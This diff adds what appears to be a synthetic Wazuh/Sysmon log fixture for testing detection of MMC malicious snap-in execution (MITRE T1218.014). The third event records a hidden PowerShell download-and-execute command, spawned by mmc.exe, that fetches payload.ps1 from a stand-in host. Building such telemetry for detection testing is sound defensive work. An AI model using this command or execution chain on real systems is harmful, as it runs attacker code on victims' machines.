@@ -1,0 +1,228 @@
+{
+  "_metadata": {
+    "attack_id": "T1218.014",
+    "variation": "001",
+    "name": "MMC - Malicious Snap-in Execution",
+    "description": "Using Microsoft Management Console (mmc.exe) to execute malicious snap-in file (.msc)",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "defense-evasion",
+    "tactic": "Defense Evasion",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 11 - Malicious .msc file creation",
+      "sequence": 1,
+      "timestamp": "2026-02-10T20:20:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T20:20:00.000Z",
+        "rule": {
+          "level": 11,
+          "description": "Sysmon - Event 11: Suspicious .msc file created in user directory",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1218.014"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "System Binary Proxy Execution: MMC"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707600000.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "11",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 20:20:00.000",
+              "processGuid": "{B5A2D3E4-1234-5678-9ABC-DEF012345701}",
+              "processId": "5124",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "targetFilename": "C:\\Users\\Public\\SystemMgmt.msc",
+              "creationUtcTime": "2026-02-10 20:20:00.000",
+              "user": "CORP\\attacker"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - mmc.exe execution with malicious snap-in",
+      "sequence": 2,
+      "timestamp": "2026-02-10T20:20:15.000Z",
+      "log": {
+        "timestamp": "2026-02-10T20:20:15.000Z",
+        "rule": {
+          "level": 13,
+          "description": "Sysmon - Event 1: mmc.exe executing suspicious .msc file from user directory",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1218.014"
+            ],
+            "tactic": [
+              "Defense Evasion"
+            ],
+            "technique": [
+              "System Binary Proxy Execution: MMC"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707600015.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 20:20:15.000",
+              "processGuid": "{B5A2D3E4-1234-5678-9ABC-DEF012345702}",
+              "processId": "6848",
+              "image": "C:\\Windows\\System32\\mmc.exe",
+              "commandLine": "\"C:\\Windows\\System32\\mmc.exe\" C:\\Users\\Public\\SystemMgmt.msc",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=LEGIT_MMC_HASH",
+              "parentProcessGuid": "{B5A2D3E4-1234-5678-9ABC-DEF012345670}",
+              "parentProcessId": "3248",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Child process spawned by mmc.exe snap-in",
+      "sequence": 3,
+      "timestamp": "2026-02-10T20:20:30.000Z",
+      "log": {
+        "timestamp": "2026-02-10T20:20:30.000Z",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: PowerShell spawned by mmc.exe snap-in (malicious behavior)",
+          "id": "100001",
+          "mitre": {
+            "id": [
+              "T1218.014",
+              "T1059.001"
+            ],
+            "tactic": [
+              "Defense Evasion",
+              "Execution"
+            ],
+            "technique": [
+              "System Binary Proxy Execution: MMC",
+              "PowerShell"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707600030.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 20:20:30.000",
+              "processGuid": "{B5A2D3E4-1234-5678-9ABC-DEF012345703}",
+              "processId": "7024",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.110/payload.ps1')\"",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=4E5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A",
+              "parentProcessGuid": "{B5A2D3E4-1234-5678-9ABC-DEF012345702}",
+              "parentProcessId": "6848",
+              "parentImage": "C:\\Windows\\System32\\mmc.exe",
+              "parentCommandLine": "\"C:\\Windows\\System32\\mmc.exe\" C:\\Users\\Public\\SystemMgmt.msc"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
